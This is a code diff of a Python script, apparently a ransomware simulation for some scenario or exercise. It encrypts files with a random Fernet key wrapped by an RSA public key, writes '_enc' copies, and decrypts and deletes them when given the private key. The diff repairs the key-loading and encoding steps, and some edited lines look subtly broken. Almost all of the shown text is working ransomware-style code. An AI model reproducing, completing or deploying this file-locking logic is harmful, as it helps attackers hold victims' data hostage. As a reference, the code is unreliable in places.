@@ -18,7 +18,7 @@ def BooeyEncryption():
     # Given a public key (this can be created outside of the scenario)
     with open('bababooeyPub.pem', mode='rb') as f:
         keyData = f.read()
-    publicKey = rsa.PublicKey.load_pkcs1_openssl_pem(keyData)
+    publicKey = rsa.PublicKey.load_pkcs1(keyData)
         #print(publicKey)
 
     # Create a Random Symmetric Key in Memory (smem)
@@ -46,8 +46,7 @@ def BooeyEncryption():
             # encrypt the file using smem, giving it a new extension, indicating it has been encrypted
             if os.path.isfile(filePath):
                 fileDir, fileName = os.path.split(filePath)
-                fileName, fileExt = os.path.splitext(fileName)
-                encryptedFileName = fileName + '_enc' + fileExt
+                encryptedFileName = fileName + '_enc'
                 encryptedFilePath = os.path.join(fileDir, encryptedFileName)
 
             # Read contents of original file
@@ -76,8 +75,8 @@ def BooeyDecryption():
     # Read the RSA private key from disk
     with open('bababooey.pem', mode='rb') as f:
         keyData = f.read()
-        print(keyData)
-    privateKey = rsa.PrivateKey._load_pkcs1_pem(keyData)
+        # print(keyData)
+    privateKey = rsa.PrivateKey.load_pkcs1(keyData)
 
     # Read the encrypted symmetric key from disk
     with open('smem-enc', 'rb') as f:
@@ -102,11 +101,11 @@ def BooeyDecryption():
             
             # Decrypt the file contents
             f = Fernet(smem)
-            decryptedData = f.decrypt(encryptedData)
+            decryptedData = f.decrypt(encryptedData.encode())
             
             # Write the decrypted contents to a new file
             with open(decryptedFilePath, 'w') as f:
-                f.write(decryptedData)
+                f.write(decryptedData.decode())
             
             # Delete the encrypted file
             os.remove(encryptedFilePath)
